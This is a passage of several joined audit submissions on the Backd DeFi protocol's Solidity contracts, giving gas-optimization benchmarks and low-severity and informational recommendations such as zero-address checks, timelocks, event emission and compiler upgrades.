├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 61511                  ┆ 339             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addressExternalBalance ┆ 417             ┆ 417 ┆ 417    ┆ 417 ┆ 1       │ ╰────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭─────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract3 contract      ┆                 ┆     ┆        ┆     ┆         │ ╞═════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost         ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 57105                   ┆ 317             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name           ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyExternalBalance ┆ 411             ┆ 411 ┆ 411    ┆ 411 ┆ 1       │ ╰─────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines  - FeeBurner.sol:102  - RewardHandler.sol:40  ---  ## Use assembly to check for address(0)  ```js   contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.ownerNotZero(address(this));         c1.assemblyOwnerNotZero(address(this));     } }  contract Contract0 {     function ownerNotZero(address _addr) public pure {         require(_addr != address(0), "zero address)");     } }  contract Contract1 {     function assemblyOwnerNotZero(address _addr) public pure {         assembly {             if iszero(_addr) {                 mstore(0x00, "zero address")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 61311              ┆ 338             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ ownerNotZero       ┆ 258             ┆ 258 ┆ 258    ┆ 258 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭──────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract   ┆                 ┆     ┆        ┆     ┆         │ ╞══════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 44893                ┆ 255             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyOwnerNotZero ┆ 252             ┆ 252 ┆ 252    ┆ 252 ┆ 1       │ ╰──────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines  - AddressProvider.sol:102  - AddressProvider.sol:105  - AddressProvider.sol:122  - AddressProvider.sol:163  - AddressProvider.sol:166  - AddressProvider.sol:295  - AddressProvider.sol:98  - Controller.sol:34  - Controller.sol:35  - Controller.sol:48  - Controller.sol:50  - Controller.sol:68  - Controller.sol:82  - FeeBurner.sol:101  - FeeBurner.sol:60  - InflationManager.sol:244  - InflationManager.sol:270  - InflationManager.sol:295  - InflationManager.sol:486  - InflationManager.sol:496  - InflationManager.sol:508  - InflationManager.sol:522  - InflationManager.sol:59  - InflationManager.sol:60  - InflationManager.sol:622  - LpGauge.sol:31  - LpGauge.sol:35  - Minter.sol:100  - PoolMigrationZap.sol:26  - PoolMigrationZap.sol:62  - Preparable.sol:100  - Preparable.sol:142  - RewardHandler.sol:45  - StakerVault.sol:119  - StakerVault.sol:160  - StakerVault.sol:205  - StakerVault.sol:226  - StakerVault.sol:238  - StakerVault.sol:326  - StakerVault.sol:372  - StakerVault.sol:66  - StakerVault.sol:76  - VestedEscrow.sol:69  - VestedEscrow.sol:75  - VestedEscrow.sol:98  ---
## Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`VestedEscrow.sol#L64-L72`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L64-L72), [`VestedEscrow.sol#L74-L78`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase mismatches between on-chain and off-chain states.  **Recommendation**: Add in the additional checks to validate if the new value being set is the same as the current value already set in the contract.   ## Missing Time locks **Severity**: Low **Context**: [`Controller.sol#L62-L76`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L62-L76)  **Description**: None of the onlyOwner functions that change critical protocol addresses/parameters appear to have a time lock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and given them a chance to perform incident response.  **Recommendation**: Add a time lock to these functions for a time-delayed change to alert users and protect against possiable malicious changes by compromised owners(s).   ## Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`Controller.sol#L33-L37`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L33-L37), [`StakerVault.sol#L98-L102`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L98-L102), [`StakerVault.sol#L197-L210`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L197-L210), [`StakerVault.sol#L218-L235`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L218-L235), [`AmmGauge.sol#L49-L54`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L49-L54), [`InflationManager.sol#L58-L63`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L58-L63), [`InflationManager.sol#L435-L438`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L435-L438), [`InflationManager.sol#L446-L467`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L446-L467), [`InflationManager.sol#L482-L489`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L482-L489), [`KeeperGauge.sol#L57-L62`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62), [`Minter.sol#L99-L102`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99-L102), [`Minter.sol#L104-L108`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L104-L108), [`VestedEscrow.sol#L64-L72`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L64-L72), [`VestedEscrow.sol#L74-L78`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Add events to functions that change critical parameters.   ## Max/Infinite Approvals are Dangerous **Severity**: Low **Context**: [`RewardHandler.sol#L62-L65`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L62-L65)  **Description**: Giving max/infinite approvals to contracts are dangerous. Giving max/infinite approvals to contracts are dangerous because if those contracts are exploited then they can remove all the funds from the approving addresses.  Recommendation Check allowance and approve as much as required.   ## TODOs Left In The Code **Severity**: Informational **Context**: [`InflationManager.sol#L532`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L532)  **Description**: There should never be any TODOs in the code when deploying.  **Recommendation**: Finish the TODOs before deploying.   ## Spelling Errors **Severity**: Informational **Context**: [`BkdLocker.sol#L173 (invlude => include)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L173), [`FeeBurner.sol#L29 (successfull => successful)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29), [`FeeBurner.sol#L29 (Emmited => Emitted)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29), [`FeeBurner.sol#L35 (Recieve => Receive)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L35), [`FeeBurner.sol#L84 (Transfering => Transferring)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L84)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Check all misspellings to ensure they are corrected.   ## Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Add in full NatSpec comments for all functions to have complete code documentation for future use.
## Catching The Array Length Prior To Loop **Context**: [`RoleManager.sol#L75-L88`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L75-L88), [`RewardHandler.sol#L35-L55`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L35-L55), [`StakerVault.sol#L256-L263`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L256-L263), [`FeeBurner.sol#L43-L88`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L43-L88), [`InflationManager.sol#L110-L125 (For L116)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L110-L125), [`VestedEscrow.sol#L89-L111`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L89-L111), [`PoolMigrationZap.sol#L20-L29`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L20-L29), [`PoolMigrationZap.sol#L38-L45`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L38-L45)  **Description**: One can save gas by caching the array length (in stack) and using that set variable in the loop. Replace state variable reads and writes within loops with local variable reads and writes. This is done by assigning state variable values to new local variables, reading and/or writing the local variables in a loop, then after the loop assigning any changed local variables to their equivalent state variables.  **Recommendation**:  Simply do something like so before the for loop: ```uint length =  variable.length```. Then add ```length``` in place of ``` variable.length``` in the for loop.    ## In `require()`, Use `!= 0` Instead of `> 0` With Uint Values **Context**: [`BkdLocker.sol#L90-L100 (For both)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L90-L100), [`BkdLocker.sol#L133-L155 (For L137)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L133-L155), [`AmmGauge.sol#L103-L116 (For L104)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103-L116), [`AmmGauge.sol#L124-L138 (For L125)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124-L138), [`KeeperGauge.sol#L125-L144 (For L140)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L125-L144), [`VestedEscrow.sol#L80-L87 (For L84)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L80-L87)  **Description**: In a require, when checking a uint, using `!= 0` instead of `> 0` saves 6 gas. This will jump over or avoid an extra `ISZERO` opcode.  **Recommendation**:  Use `!= 0` instead of `> 0` with uint values but only in `require()` statements.   ## Setting The Constructor To Payable **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: You can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.  **Recommendation**:  Set the constructor to payable.   ## Function Ordering via Method ID **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.  **Recommendation**:  Find a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas.
### Redundant checks can be removed  **Details**: The checks on [L575](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L575), [L589](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L589) and [L602](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L602) of CrvDepositor.sol can be removed since the variables `totalKeeperPoolWeight`, `totalLpPoolWeight` and `totalAmmTokenWeight` are `uint256` and the unchecked versions of add and sub are not used before these lines.   ### Some if conditions can be simplified changing ≤ to ==  **Details**: Some variables in the contract are of the type `uint256` and will never be strictly negative. Thus, to check if these variables are not strictly positive you only need to check if they are equal to 0 — this will economize gas because EVM instruction set does not have an opcode for the condition "less than or eq", only for "less than" and "equal" opcodes.   In view of this it is suggested to perform the following simplifications:  - Since `amount` in [L62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L62) of AmmGauge.sol is `uint256`, the if condition at [L63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L63) can be simplified to          ```solidity     if (amount == 0) return 0;     ```      - Since the variables `amount`, `crvAmount` and `crxAmount` in [L70-72](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L70-L72) of AmmConvexGauge.sol are `uint256`, the if condition at [L73](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L73) can be simplified to          ```solidity     if (amount == 0 && crvAmount == 0 && cvxAmount == 0) return 0;     ```      - Since the variable `amount` in [L58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L58) of LpGauge.sol is `uint256`, the if condition at [L59](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L59) can be simplified to          ```solidity     if (amount == 0) return 0;     ```       ### Pre-incrementing a variable is cheaper than post-incrementing it  **Details**: Consider changing [L59](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59) and [L98](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98) of KeeperGauge.sol to `++epoch;`. For more information, see [G012](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g012---use-prefix-increment-instead-of-postfix-increment-if-possible) of c4-common-issues.  ### Unused library  **Details**: `ScaledMath` is added to `uint256` in BkdToken.sol, but its functions are not used. Consider removing it.
# `Approve` not compatible with Tether (USDT) implementation  Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT or CVX)'s `approve()` function will revert if the current approval is not zero, to protect against front-running changes of approvals.  ```javascript function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {       // To change the approve amount you first have to reduce the addresses`      //  allowance to zero by calling `approve(_spender, 0)` if it is not      //  already 0 to mitigate the race condition described here:      //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));       allowed[msg.sender][_spender] = _value;      Approval(msg.sender, _spender, _value);  } ```  The code as currently implemented does not handle these sorts of tokens properly, which would prevent USDT or CVX, from being used by this project.  If the method [allPools](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L21) return pools with duplicate underlyings, it will fault in the case of USDT or CVX, for example.  Affected source code:  - [PoolMigrationZap.sol#L27](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L27)  # Lack of checks  The following methods have a lack checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  Affected source code:  - [RoleManager.sol#L32](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L32) - [Authorization.sol#L10](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/Authorization.sol#L10) - [RoleManager.sol#L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L151) - [RoleManager.sol#L157](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L157) - [StakerVault.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L71) - [BkdLocker.sol#L49-L50](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L49-L50) - [AddressProvider.sol#L50](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L50) - [AddressProvider.sol#L56](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L56) - [AddressProvider.sol#L65](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L65) - [AddressProvider.sol#L70](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L70) - [AddressProvider.sol#L81](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L81) - [BkdToken.sol#L21](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/BkdToken.sol#L21) - [FeeBurner.sol#L32](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L32) - [VestedEscrowRevocable.sol#L43](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L43) - [KeeperGauge.sol#L48](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L48) - [VestedEscrow.sol#L52](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L52) - [VestedEscrow.sol#L55](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L55) - [AmmGauge.sol#L39](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L39)  If you set any wrong address, without being a contract, an EOA for example, it cannot be changed again:  - [Controller.sol#L36](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L36) - [Minter.sol#L100](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L100) - [InflationManager.sol#L61](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L61)  Lack of int range checks: - [Minter.sol#L61-L69](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L61-L69)  Not max defined: - [Preparable.sol#L29](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L29)  # Lack of ACK during owner change  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [RoleManager.sol#L41-L48](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L41-L48) - [VestedEscrow.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L71)  # Avoid errors with transferFrom  The following methods take all the user's balance and send it through `transferFrom`, this call may fail, since `transferFrom` extracts the balance from the previously approved `allowance`, it is better to use the user's `allowance` in order to avoid the unnecessary failure when both amounts are not the same. It's better to use `allowance` instead of `balanceOf`.  Affected source code:  - [FeeBurner.sol#L68-L70](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L68-L70)  # Wrong logic around `grantRole` and `revokeRole`.  The `RoleManager` contract contains a few special roles (`Roles.ADDRESS_PROVIDER`, `Roles.POOL_FACTORY`, `Roles.CONTROLLER`, `Roles.POOL` and `Roles.VAULT`) that are not controlled in the `grantRole` and `revokeRole` methods.  Affected source code:  - [RoleManager.sol#L37](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L37) - [RoleManager.sol#L111](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L111)  # Centralization risks  ## Multiple initialization  The `initialize` method of the `BkdLocker` contract allows it to be started multiple times as long as the value `startBoost=0` is set. Abuse these settings to his advantage.  Affected source code:  - [BkdLocker.sol#L53-L63](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L53-L63)  ## Centralized minting  The `minter` address can `mint` arbitrary amount of tokens. If the private key of the owner or minter address is compromised, the attacker will be able to `mint` an unlimited amount of tokens, or `burn` from arbitrary addresses.  Affected source code:  - [BkdToken.sol#L30](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/BkdToken.sol#L30)  ## Controlled swapRouter  The `FeeBurner` contract sets the `swapperRouter` in the `_addressProvider`, so the owner can set any type of swapper, paths or pools, even malicious ones. Since there is no slippage defined in the `FeeBurner` contract itself, it could be that a `swapperRouter` returns 0 WETH, and keeps the sent tokens.  Affected source code:  - [FeeBurner.sol#L73](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L73) 
 # Outdated compiler  The pragma version used is `pragma solidity 0.8.10;` but recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  # Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  I suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next (require pragma upgrade).  ## Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  ### Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Affected source code:  - [Errors.sol#L7-L111](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/libraries/Errors.sol#L7-L111) - [Minter.sol#L152](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152)  # Delete optimization  Use `delete` instead of set to default value (`false` or `0`)  Affected source code:  - [RoleManager.sol#L158](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L158) - [Preparable.sol#L87-L88](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L87-L88) - 